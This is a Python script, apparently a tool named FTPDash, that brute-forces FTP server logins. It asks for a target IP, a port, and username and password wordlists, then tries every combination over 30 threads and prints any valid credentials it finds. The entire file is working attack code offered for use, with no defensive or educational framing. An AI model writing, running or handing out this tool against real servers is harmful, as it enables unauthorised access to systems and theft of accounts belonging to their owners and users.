import ftplib
from threading import Thread
import queue
from termcolor import colored

print (colored('''

███████╗████████╗██████╗░██████╗░░█████╗░░██████╗██╗░░██╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║
█████╗░░░░░██║░░░██████╔╝██║░░██║███████║╚█████╗░███████║
██╔══╝░░░░░██║░░░██╔═══╝░██║░░██║██╔══██║░╚═══██╗██╔══██║
██║░░░░░░░░██║░░░██║░░░░░██████╔╝██║░░██║██████╔╝██║░░██║
╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝
                           Developed By Entity.Network 
                           

''', "red" ))


q = queue.Queue()
n_threads = 30
host = input(colored("[!] Enter Ftp server Ip Address : ", "blue" ))
port = int(input(colored("[!] Enter Ftp server port: ", "blue")))
username_file = input(colored("[!] Enter the path to the file containing usernames (press enter to skip): ", "blue" ))
if username_file:
    with open(username_file) as f:
        usernames = f.read().split("\n")
else:
    username = input(colored("[!] Enter the username: ", "blue" ))
    usernames = [username]

password_file = input(colored("[!] Enter the path to the file containing passwords: ", "blue" ))
passwords = open(password_file).read().split("\n")
print("[+] Passwords to try:", len(passwords))

credentials_found = False

def connect_ftp():
    global q, credentials_found
    while True:
                
        password, username = q.get()
        
        print("[!] Trying", username, password)
        server = ftplib.FTP()
        try:
            
            server.connect(host, port, timeout=5)
            
            server.login(username, password)
        except ftplib.error_perm:
            
            pass
        else:
            
            print(colored(f"[+] Found credentials: ", 'green' ))
            print(colored(f"\tHost: {host}", 'green'))
            print(colored(f"\tUser: {username}", 'green'))
            print(colored(f"\tPassword: {password}", 'green'))
            credentials_found = True
            
            break
        finally:
            q.task_done()


for username in usernames:
    for password in passwords:
        q.put((password, username))

for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    thread.daemon = True
    thread.start()


q.join()

if credentials_found:
    print(colored("[+] Credentials found.", 'green'))
else:
    print(colored("[!] No username/password combination was found.", 'red'))

